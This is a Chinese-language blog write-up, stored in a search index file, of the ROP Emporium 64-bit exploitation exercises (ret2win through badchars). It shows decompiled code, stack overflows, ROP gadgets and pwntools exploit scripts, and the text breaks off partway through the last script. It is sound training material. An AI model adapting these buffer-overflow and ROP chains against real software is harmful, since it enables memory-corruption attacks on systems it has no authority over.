@@ -1,0 +1,617 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>ROP Emporium (64位)-writeup</title>
+    <url>/2021/12/24/ROP-Emporium-64%E4%BD%8D/</url>
+    <content><![CDATA[<p>部分writeup</p>
+<span id="more"></span>
+<h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2win by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="pwnme函数"><a href="#pwnme函数" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个栈溢出漏洞，调用后门拿到flag</p>
+<h3 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400756</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>checksec一下，64位程序，只开启了NX保护。</p>
+<h2 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-1"><a href="#main函数-1" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;split by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwnme函数-1"><a href="#pwnme函数-1" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个栈溢出漏洞</p>
+<h3 id="usefulFunction"><a href="#usefulFunction" class="headerlink" title="usefulFunction"></a>usefulFunction</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>属于是出题人给的hint，程序中存在system函数，也存在能调用的数据段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000601060	00000012	C	/bin/cat flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>由于64位程序传参(前6个)要通过寄存器 RDI、RSI、RDX、 RCX、R8 和 R9，因此我们需要构造ROP链来进行栈溢出操作。</p>
+<p>查找pop rdi的地址，利用ROPgadget</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4007c3</span>)+p64(<span class="number">0x601060</span>)+p64(<span class="number">0x400560</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>checksec一下，64位程序，只开启了NX。</p>
+<h2 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-2"><a href="#main函数-2" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;callme by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  pwnme();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="callme-two函数"><a href="#callme-two函数" class="headerlink" title="callme_two函数"></a>callme_two函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">callme_two</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xDEADBEEFDEADBEEF</span>LL || a2 != <span class="number">0xCAFEBABECAFEBABE</span>LL || a3 != <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stream = fopen(<span class="string">&quot;key1.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key1.dat&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    g_buf[i] ^= fgetc(stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;callme_two() called correctly&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="callme-three函数"><a href="#callme-three函数" class="headerlink" title="callme_three函数"></a>callme_three函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">callme_three</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;key2.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">16</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(stream);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个函数都对附件中的文件进行了操作，应该是得到flag或者下一步提示的操作。要调用的话我们要将它们的参数分别重新设置一下。</p>
+<p>因为callme函数调用后直接就exit了，所以还要找到ret地址</p>
+<p>找到需要的rop</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">set_a=p64(<span class="number">0x40093c</span>)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+set_a+p64(<span class="number">0x400720</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x400740</span>)</span><br><span class="line">payload+=set_a+p64(<span class="number">0x4006F0</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h1><p>checksec一下，64位程序，只开启了NX。</p>
+<h2 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-3"><a href="#main函数-3" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pwnme函数是个外联函数，属于附件中libwrite4.so的。待会查看一下</p>
+<h3 id="usefulFunction函数"><a href="#usefulFunction函数" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示有print_file函数可以被调用</p>
+<h3 id="pwnme函数-2"><a href="#pwnme函数-2" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write4 by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Go ahead and give me the input already!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在栈溢出漏洞。</p>
+<h3 id="print-file函数"><a href="#print-file函数" class="headerlink" title="print_file函数"></a>print_file函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以用来读取有用的文件，再看看有没有可以用的数据段……好像没得</p>
+<p>找到一个可读写的段，比如bss段，正好8字节长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>
+
+<p>查找有用的rop，就在usefulFunction函数的汇编代码下边有个usefulGadget</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 mov     [r14], r15</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062B</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>然后解题思路就很明了了，设r14和r15寄存器的值分别为bss段地址和’flag.txt’然后调用usefulGadget，然后bss段传入rdi作为usefulFunction的参数调用</p>
+<p>查看有用的gadget</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400690 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400693 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./write4&#x27;</span>)</span><br><span class="line">usefulGadget=<span class="number">0x400628</span></span><br><span class="line">pop_r14_r15=<span class="number">0x400690</span></span><br><span class="line">pop_rdi=<span class="number">0x400693</span></span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r14_r15)+p64(bss)+p64(<span class="number">0x7478742e67616c66</span>)+p64(usefulGadget)+p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h1><h2 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-4"><a href="#main函数-4" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(argc, argv, envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pwnme函数是外联函数待会看</p>
+<h3 id="usefulFunction函数-1"><a href="#usefulFunction函数-1" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> print_file(<span class="string">&quot;nonexistent&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>print_file函数也是外联函数</p>
+<h3 id="pwnme函数-3"><a href="#pwnme函数-3" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 j; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个栈溢出</p>
+<h3 id="print-file"><a href="#print-file" class="headerlink" title="print_file"></a>print_file</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">print_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(a1, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to open file: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为做过wirte4的原因，我首先就去看了看text段，果然有usefulGadget</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400628</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400628</span></span><br><span class="line">.text:<span class="number">0000000000400628</span> usefulGadgets:</span><br><span class="line">.text:<span class="number">0000000000400628</span>                 <span class="keyword">xor</span>     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062B</span>                 retn</span><br><span class="line">.text:<span class="number">000000000040062</span>C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040062</span>C                 add     [r15], r14b</span><br><span class="line">.text:<span class="number">000000000040062F</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400630</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400630</span>                 sub     [r15], r14b</span><br><span class="line">.text:<span class="number">0000000000400633</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400634</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400634</span>                 mov     [r13+<span class="number">0</span>], r12</span><br><span class="line">.text:<span class="number">0000000000400638</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400638</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000400639</span>                 align <span class="number">20</span>h</span><br><span class="line">.text:<span class="number">0000000000400640</span></span><br><span class="line">.text:<span class="number">0000000000400640</span> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没有可用的数据段，找一个可读写的自己写，比如bss段，正好8字节</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idx=23 addr=0x00001038 off=0x00001038 sz=8 vsz=8 perm=-rw- name=.bss</span><br></pre></td></tr></table></figure>
+
+<p>通过  mov     [r13+0], r12把’flag.txt’写入bss段，可以利用这段给r13,r12 赋值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
+
+<p>但是因为后边会给检测输入有没有’x’,’g’,’a’,’.’，所以我们还要使用剩下的Gadget绕过</p>
+<p>本来是想用’flag.txt’的十六进制形式与0xffffffffffffffff进行异或运算存入后再异或一次就能得到正确的字符串，但是xor好像只能进行一个字节一个字节的进行异或，所以还原时只能进行每位与0xff异或了</p>
+<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./badchars&#x27;</span>)</span><br><span class="line">print_file=<span class="number">0x400510</span></span><br><span class="line">bss=<span class="number">0x601038</span></span><br><span class="line">mov_r13_r12=<span class="number">0x400634</span></span><br><span class="line">pop_r12_r13_14_15=<span class="number">0x40069c</span></span><br><span class="line">pop_rdi=<span class="number">0x4006a3</span></span><br><span class="line">xor_r15_r14=<span class="number">0x400628</span></span><br><span class="line">pop_r14_15=<span class="number">0x4006a0</span></span><br><span class="line">payload=<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(pop_r12_r13_14_15)+p64(<span class="number">0x8b878bd1989e9399</span>)+p64(bss)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mov_r13_r12)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	payload+=p64(pop_r14_15)+p64(<span class="number">0xff</span>)+p64(bss+i)+p64(xor_r15_r14)</span><br><span 